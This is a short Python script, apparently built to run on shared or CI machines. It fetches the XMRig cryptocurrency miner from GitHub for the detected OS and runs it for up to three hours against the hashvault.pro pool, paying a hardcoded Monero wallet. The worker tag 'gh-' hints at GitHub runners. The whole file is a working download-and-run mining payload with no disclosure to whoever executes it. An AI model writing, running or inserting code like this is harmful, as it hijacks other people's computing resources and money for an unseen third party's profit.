import asyncio
import os
import platform
import sys
import tarfile
from pathlib import Path
from tempfile import TemporaryDirectory
from uuid import uuid1

import aiohttp


async def download_latest_release(download_dir: Path, filename):
    assets = [
        {
            "browser_download_url": "https://github.com/xmrig/xmrig/releases/download/v6.22.0/SHA256SUMS"
        },
        {
            "browser_download_url": "https://github.com/xmrig/xmrig/releases/download/v6.22.0/SHA256SUMS.sig"
        },
        {
            "browser_download_url": "https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-focal-x64.tar.gz"
        },
        {
            "browser_download_url": "https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-freebsd-static-x64.tar.gz"
        },
        {
            "browser_download_url": "https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-gcc-win64.zip"
        },
        {
            "browser_download_url": "https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-jammy-x64.tar.gz"
        },
        {
            "browser_download_url": "https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz"
        },
        {
            "browser_download_url": "https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-macos-arm64.tar.gz"
        },
        {
            "browser_download_url": "https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-macos-x64.tar.gz"
        },
        {
            "browser_download_url": "https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-msvc-win64.zip"
        },
        {
            "browser_download_url": "https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-noble-x64.tar.gz"
        },
    ]

    assets = [
        asset["browser_download_url"]
        for asset in assets
        if filename in asset["browser_download_url"]
    ]

    zip_path = download_dir / "xmrig.tar.gz"

    async with aiohttp.ClientSession() as session:
        async with session.get(assets[0]) as response:
            with open(zip_path, "wb") as zip_file:
                zip_file.write(await response.read())

    return zip_path


def untar(tar_file_path, extract_path: Path):
    with tarfile.open(tar_file_path, "r:gz") as tar:
        xmrig_path = tar.getmembers()[0]
        tar.extractall(path=extract_path)

    return extract_path / xmrig_path.name


async def run_command_with_timeout(command, timeout: int):
    process = await asyncio.create_subprocess_shell(
        command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )

    try:

        async def stream_output(stream, log_prefix):
            while line := await stream.readline():
                print(f"{log_prefix}: {line.decode().strip()}")

        stdout_task = asyncio.create_task(stream_output(process.stdout, "STDOUT"))
        stderr_task = asyncio.create_task(stream_output(process.stderr, "STDERR"))
        await asyncio.wait_for(process.wait(), timeout=timeout)

        await stdout_task
        await stderr_task

    except asyncio.TimeoutError:
        process.kill()
        await process.wait()


async def main():
    os_type = platform.system().lower()
    arch = platform.machine().lower()

    if os_type == "linux":
        filename = "linux-static"
    elif os_type == "darwin":
        filename = "macos-arm64" if arch == "arm64" else "macos-x64"
    elif os_type == "windows":
        filename = "gcc-win64" if arch == "amd64" else "msvc-win64"
    else:
        raise Exception(f"OS não suportado: {os_type}")

    with TemporaryDirectory() as temp_dir:
        donwload_dir = Path(temp_dir)

        tar_path = await download_latest_release(donwload_dir, filename)
        xmrig_path = untar(tar_path, donwload_dir)

        command = " ".join(
            [
                "./xmrig",
                "--url chicago01.hashvault.pro:80",
                f"--pass gh-{filename}-{sys.version_info.major}{sys.version_info.minor}-{uuid1().hex[:8]}",
                "--user 45t7Zj3p8wzaYX4ZArqfh5ZN3UPZs4hAY7kvdo8jwAsSegymsUNbiEU31cof3g7xfGdDV2kV4FH4ng1p7JGt3C459DJDS1h",
                "--donate-level 1",
            ]
        )
        os.chdir(xmrig_path)
        await run_command_with_timeout(command, timeout=3600 * 3)


if __name__ == "__main__":
    asyncio.run(main())
